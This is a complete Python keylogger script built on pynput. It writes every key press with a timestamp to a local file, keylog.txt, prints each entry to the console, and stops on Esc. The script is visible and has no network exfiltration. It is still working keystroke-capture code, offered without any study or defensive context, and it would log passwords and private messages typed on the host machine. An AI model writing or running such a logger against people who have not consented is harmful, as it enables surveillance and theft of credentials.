from pynput import keyboard
import time

log_file_path = "keylog.txt"

def on_key_press(key):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    try:
        with open(log_file_path, "a") as log_file:
            log_file.write(f"{timestamp} - {key.char}\n")
        print(f"Logged: {timestamp} - {key.char}")
    except AttributeError:
        with open(log_file_path, "a") as log_file:
            log_file.write(f"{timestamp} - {key}\n")
        print(f"Logged: {timestamp} - {key}")

    # Check if the pressed key is Esc
    if key == keyboard.Key.esc:
        print('Stopping the keylogger...')
        return False

def main():
    print("Press Esc to stop logging.")
    
    # Start the keyboard listener
    with keyboard.Listener(on_press=on_key_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()